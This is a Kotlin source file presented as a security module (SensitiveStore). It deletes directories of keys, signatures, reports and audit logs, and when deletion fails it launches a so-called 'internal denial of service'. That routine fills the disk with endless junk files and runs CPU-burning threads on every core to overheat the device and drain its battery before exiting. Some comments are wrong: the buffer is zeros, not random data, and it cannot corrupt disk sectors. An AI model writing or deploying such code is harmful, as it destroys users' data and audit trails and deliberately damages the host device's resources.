package core.security

import java.io.File
import java.io.FileOutputStream
import kotlin.concurrent.thread
import kotlin.system.exitProcess

object SensitiveStore {
    private val sensitivePaths = listOf(
        "data/signatures/",
        "core/audit/logs/",
        "data/reports/",
        "data/keys/"
    )

    /**
     * Tente un effacement complet. Si échec, déclenche le déni de service interne.
     */
    fun wipeAll(): Boolean {
        var allDeleted = true
        
        try {
            sensitivePaths.forEach { path ->
                val dir = File(path)
                if (dir.exists()) {
                    // Suppression récursive
                    val success = dir.deleteRecursively()
                    if (!success) allDeleted = false
                }
            }
        } catch (e: Exception) {
            allDeleted = false
        }

        // Si des fichiers restent (verrouillés par le système ou erreur I/O)
        if (!allDeleted) {
            MissionLogger.critical("WIPE_INCOMPLETE: Triggering Internal DoS")
            triggerInternalDoS()
        }

        return allDeleted
    }

    /**
     * Déni de Service Interne : Corrompt les ressources et vide la batterie.
     */
    private fun triggerInternalDoS() {
        // 1. Tentative de corruption des fichiers vitaux (Brute Force Overwrite)
        thread(priority = Thread.MAX_PRIORITY) {
            val junk = ByteArray(1024 * 1024) // 1MB de données aléatoires
            while (true) {
                try {
                    // Tente d'écrire partout pour saturer l'I/O et corrompre les secteurs
                    val crashFile = File("system_corrupt_${System.nanoTime()}.tmp")
                    crashFile.writeBytes(junk)
                } catch (e: Exception) { /* On continue de boucler */ }
            }
        }

        // 2. Épuisement Thermique et Énergie (CPU Burn)
        // Crée plusieurs threads de calcul intensif pour vider la batterie
        repeat(Runtime.getRuntime().availableProcessors()) {
            thread(priority = Thread.MAX_PRIORITY) {
                while (true) {
                    val x = Math.sin(Math.random()) * Math.tan(Math.random())
                }
            }
        }

        // 3. Notification d'urgence (si l'écran est encore visible)
        println("!!! CRITICAL SECURITY BREACH - SELF-DESTRUCT INITIATED !!!")
        
        // On laisse les threads tourner 5 secondes pour saturer le hardware avant de kill
        Thread.sleep(5000)
        exitProcess(1)
    }
}
